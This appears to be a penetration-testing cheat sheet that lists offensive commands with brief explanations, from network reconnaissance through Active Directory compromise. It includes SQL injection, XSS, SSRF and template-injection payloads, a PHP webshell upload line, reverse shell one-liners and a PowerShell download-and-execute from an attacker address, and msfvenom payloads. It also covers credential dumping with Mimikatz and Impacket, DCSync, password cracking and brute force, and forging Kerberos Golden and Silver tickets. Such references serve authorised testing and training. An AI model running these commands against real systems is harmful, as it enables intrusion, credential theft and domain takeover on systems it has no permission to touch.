01Enumeration & Recon
Nmap Scanning
nmap -sn 10.10.10.0/24
Host discovery / ping sweep across a subnet.
nmap -p- --min-rate 5000 -T4 <target>
Fast full TCP port sweep before targeted scans.
nmap -sC -sV -p<ports> -oA scan <target>
Default scripts + version detection on discovered ports.
nmap -sU --top-ports 100 <target>
Top 100 UDP ports.
nmap --script vuln <target>
Run NSE vulnerability-detection scripts.
nmap -A -Pn <target>
Aggressive scan (OS/version/scripts/traceroute), skip host discovery.
Web Fuzzing
gobuster dir -u <url> -w wordlist.txt -x php,html,txt
Directory/file brute force with common extensions.
gobuster vhost -u <url> -w subdomains.txt
Virtual host discovery.
ffuf -u https://target/FUZZ -w wordlist.txt -mc 200,301,302
Fast fuzzing, filtered by response status codes.
ffuf -u https://FUZZ.target.com -w subdomains.txt -fs 0
Subdomain fuzzing, filtering out empty responses.
wfuzz -c -z file,wordlist.txt --hc 404 https://target/FUZZ
Content discovery, hiding 404 responses.
katana -u <url> -d 3 -jc -o urls.txt
Crawl a target for endpoints, including JS-discovered links.
SMB Enumeration
smbclient -L //<target> -N
List shares anonymously.
smbmap -H <target> -u anonymous
Enumerate share permissions.
enum4linux -a <target>
Full SMB/NetBIOS enumeration — users, shares, policies.
crackmapexec smb <target> -u '' -p '' --shares
Null-session share enumeration across a range.
DNS & LDAP Enumeration
dig axfr @ns1.target.com target.com
Attempt a DNS zone transfer.
dnsrecon -d target.com -t axfr,std,brt
Combined zone transfer, standard, and brute-force enumeration.
nslookup -type=any target.com
Quick manual record lookup.
ldapsearch -x -h <dc-ip> -b "dc=domain,dc=com"
Anonymous LDAP bind and directory dump.
02Web Application Attacks
SQL Injection
' OR '1'='1'-- -
Classic authentication-bypass probe.
' UNION SELECT null,version()-- -
UNION-based enumeration once column count is known.
' AND SLEEP(5)-- -
Blind, time-based confirmation of injectable input.
sqlmap -u "<url>" --batch --dbs
Automated detection and database enumeration.
Cross-Site Scripting (XSS)
<script>alert(document.domain)</script>
Baseline reflected/stored XSS probe.
"><img src=x onerror=alert(1)>
Attribute-breakout payload for tag-filtered contexts.
<svg onload=alert(1)>
Alternate tag when <script> is blocked by a filter.
'"--></style></script><svg onload=alert(1)>
Polyglot payload for testing multiple contexts at once.
Server-Side Request Forgery
url=http://169.254.169.254/latest/meta-data/
Probe cloud instance metadata endpoints via a vulnerable fetch parameter.
url=http://127.0.0.1:6379/
Probe internal-only services reachable from the server.
url=http://[::1]:80/ | url=http://0177.0.0.1/
IP-encoding bypasses for naive allow-list filters.
Server-Side Template Injection
{{7*7}} | ${7*7} | <%= 7*7 %>
Baseline probes to fingerprint the templating engine.
{{config.items()}}
Jinja2 (Flask) config-disclosure probe.
tplmap -u "<url>"
Automated SSTI detection and exploitation.
File Upload Attacks
shell.php.jpg | shell.jpg.php
Double-extension bypass for weak extension filters.
Content-Type: image/jpeg (spoofed header)
MIME-type bypass in Burp Repeater during upload.
GIF89a; <?php system($_GET['c']); ?>
Magic-byte prefix to defeat content-sniffing checks.
Insecure Deserialization
ysoserial -p CommonsCollections5 -c "<cmd>"
Generate a Java gadget-chain payload.
phpggc Laravel/RCE9 "<cmd>"
PHP gadget-chain generator for known frameworks.
pickle.loads(untrusted_data)
Python note: never deserialize untrusted pickle data — arbitrary code execution risk.
03Shells & Payloads
Reverse Shell One-Liners
nc -lvnp <port>
Start a listener on the attacking machine first.
bash -i >& /dev/tcp/<ip>/<port> 0>&1
Classic bash reverse shell one-liner.
python3 -c 'import socket,os,pty;...'
Python3 reverse shell (full snippet: revshells.com).
perl -e 'use Socket;$i="<ip>";$p=<port>;...'
Perl reverse shell for legacy targets without netcat.
PowerShell Shells
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('<ip>',<port>);..."
TCP reverse shell skeleton for Windows targets.
IEX(New-Object Net.WebClient).DownloadString('http://<ip>/shell.ps1')
Download-and-execute a staged PowerShell payload.
Invoke-PowerShellTcp.ps1 (Nishang)
Reference scripted reverse shell from the Nishang toolkit.
Msfvenom Payloads
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o shell.exe
Windows EXE reverse shell payload.
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o shell.elf
Linux ELF reverse shell payload.
msfvenom -p php/reverse_php LHOST=<ip> LPORT=<port> -f raw -o shell.php
PHP reverse shell for a vulnerable upload endpoint.
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o met.exe
Full Meterpreter payload for post-exploitation.
Shell Stabilization
python3 -c 'import pty; pty.spawn("/bin/bash")'
Upgrade a raw shell to a semi-interactive TTY.
Ctrl+Z → stty raw -echo; fg
Background the shell, fix local terminal, foreground it again.
export TERM=xterm; stty rows <n> columns <n>
Restore terminal size and type after stabilizing.
04Linux Privilege Escalation
SUID / SGID Exploitation
find / -perm -4000 -type f 2>/dev/null
List SUID binaries — check each against GTFOBins.
find / -perm -2000 -type f 2>/dev/null
List SGID binaries for the same treatment.
Sudo Misconfigurations
sudo -l
List commands the current user can run as another user/root.
sudo <allowed-binary> ...
Escalate via a permitted binary's GTFOBins sudo entry.
Cron Job Abuse
cat /etc/crontab; ls -la /etc/cron.*
Check scheduled tasks for writable scripts.
./pspy64
Monitor processes/cron in real time without root.
Kernel Exploits
uname -a; searchsploit $(uname -r)
Check the running kernel against known exploit-DB entries.
lsb_release -a
Identify distro/version for targeted CVE lookups.
Linux Capabilities
getcap -r / 2>/dev/null
Find binaries with elevated capabilities (e.g. cap_setuid).
Cross-check results against GTFOBins "Capabilities"
Confirm whether the capability is exploitable for the binary found.
NFS & Writable Paths
showmount -e <target>
List exported NFS shares from a target.
find / -writable -type d 2>/dev/null
Locate world-writable directories worth checking (esp. with no_root_squash).
05Windows Privilege Escalation
Potato Attacks
whoami /priv
Check for SeImpersonatePrivilege / SeAssignPrimaryToken before attempting.
PrintSpoofer.exe -i -c cmd
Reference invocation pattern for the Potato-family privilege abuse.
Service Misconfigurations
accesschk.exe -uwcqv "Authenticated Users" *
Find services with weak permissions.
sc qc <service> | icacls "<binary path>"
Query a service's config, then check write access on its binary.
AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
Check the machine-level policy key.
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
Check the user-level policy key — both must be 1 to be exploitable.
DLL Hijacking
Procmon → filter "NAME NOT FOUND" on .dll
Find DLLs a process searches for but can't locate.
icacls "<search-path>"
Confirm write access to a directory earlier in the DLL search order.
UAC Bypass
whoami /groups
Check current integrity level before attempting a bypass.
UACME (cataloged technique reference)
Reference project cataloging known auto-elevate UAC bypass techniques.
Credential Harvesting
reg save hklm\sam sam.hive; reg save hklm\system system.hive
Extract SAM/SYSTEM hives for offline hash extraction.
privilege::debug → sekurlsa::logonpasswords
Mimikatz: dump credentials from LSASS memory (needs local admin).
findstr /si password *.txt *.ini *.config
Search common config/text files for plaintext credentials.
06Password Attacks
Hashcat
hashcat --identify hash.txt
Auto-detect a hash type before choosing a mode.
hashcat -m 1000 hashes.txt rockyou.txt
Dictionary attack against NTLM hashes.
hashcat -m 13100 -a 0 tgs.txt wordlist.txt
Crack Kerberoastable TGS hashes.
hashcat -m 18200 -a 0 asrep.txt wordlist.txt
Crack AS-REP roastable hashes.
John the Ripper
john --wordlist=rockyou.txt hash.txt
Standard dictionary attack.
john --format=nt hash.txt
Force a specific hash format when auto-detect is ambiguous.
unshadow passwd.txt shadow.txt > combined.txt
Merge Linux passwd/shadow before cracking.
Hydra & Brute Force
hydra -l <user> -P wordlist.txt ssh://<target>
Online brute force against an SSH login.
hydra -L users.txt -P pass.txt <target> http-post-form "..."
Credential brute force against a web login form.
medusa -h <target> -u <user> -P wordlist.txt -M ssh
Alternative brute-force tool with parallel host support.
Hash Extraction
secretsdump.py domain/user:pass@<target>
Remote SAM/NTDS.dit hash dump (Impacket).
reg save hklm\sam sam.hive
Local SAM extraction for offline processing.
lsadump::sam
Mimikatz: dump local hashes directly from a live session.
07Pivoting & Tunneling
SSH Tunneling
ssh -L <local-port>:<dest>:<dest-port> user@<pivot>
Local port forward through a compromised host.
ssh -R <remote-port>:localhost:<local-port> user@<pivot>
Remote port forward back to the attacker.
ssh -D <port> user@<pivot>
Dynamic SOCKS proxy through a pivot host.
Chisel
chisel server -p <port> --reverse
Start a chisel server on the attacker box.
chisel client <attacker-ip>:<port> R:socks
Connect from the pivot host to open a reverse SOCKS tunnel.
chisel client <attacker-ip>:<port> R:8080:127.0.0.1:80
Forward a single internal port back to the attacker.
Ligolo-ng
./proxy -selfcert
Start the attacker-side listener/proxy.
./agent -connect <attacker-ip>:11601 -ignore-cert
Connect the agent from the pivot host.
ip route add <target-subnet> dev ligolo
Route traffic to the internal network through the tunnel interface.
Sshuttle & ProxyChains
sshuttle -r user@<pivot> 10.10.10.0/24
Transparent, VPN-style subnet tunnel over SSH.
proxychains nmap -sT -Pn <internal-target>
Route existing tools through a SOCKS proxy defined in proxychains.conf.
08Active Directory
Kerberoasting
GetUserSPNs.py domain/user:pass -request
Request and dump service ticket hashes (Impacket).
Rubeus.exe kerberoast /outfile:hashes.txt
Windows-native alternative for the same technique.
AS-REP Roasting
GetNPUsers.py domain/ -usersfile users.txt -no-pass
Target accounts with Kerberos pre-authentication disabled.
Rubeus.exe asreproast
Windows-native AS-REP roasting.
Pass the Hash
crackmapexec smb <target> -u user -H <NTLM-hash>
Authenticate across a target range using a captured hash.
psexec.py -hashes :<NTLM-hash> domain/user@<target>
Remote command execution via pass-the-hash (Impacket).
evil-winrm -i <target> -u user -H <NTLM-hash>
WinRM shell access using pass-the-hash.
DCSync
lsadump::dcsync /user:krbtgt
Mimikatz: simulate a DC to pull password hashes remotely.
secretsdump.py domain/user:pass@<dc-ip>
Impacket equivalent for remote DC hash extraction.
ACL / ACE Abuse
Get-DomainObjectAcl -ResolveGUIDs
PowerView: enumerate ACEs to find abusable permissions.
BloodHound → GenericAll / WriteDACL edges
Graph-based discovery of exploitable ACL paths to a target.
dacledit.py -action write ...
Impacket: write a malicious ACE once a foothold permission is found.
Delegation Attacks
Get-DomainComputer -TrustedToAuth
PowerView: discover unconstrained/constrained delegation.
Rubeus.exe s4u /impersonateuser:<user> ...
Abuse constrained delegation via S4U.
findDelegation.py domain/user:pass
Impacket: enumerate all delegation configurations domain-wide.
Golden & Silver Tickets
kerberos::golden /user:x /domain:x /sid:x /krbtgt:<hash> /ptt
Mimikatz: forge a Golden Ticket for persistent domain access.
kerberos::golden ... /service:cifs
Silver ticket variant, scoped to a specific service.
ticketer.py -nthash <hash> -domain-sid <sid> -domain <domain> <user>
Impacket equivalent for ticket forging.
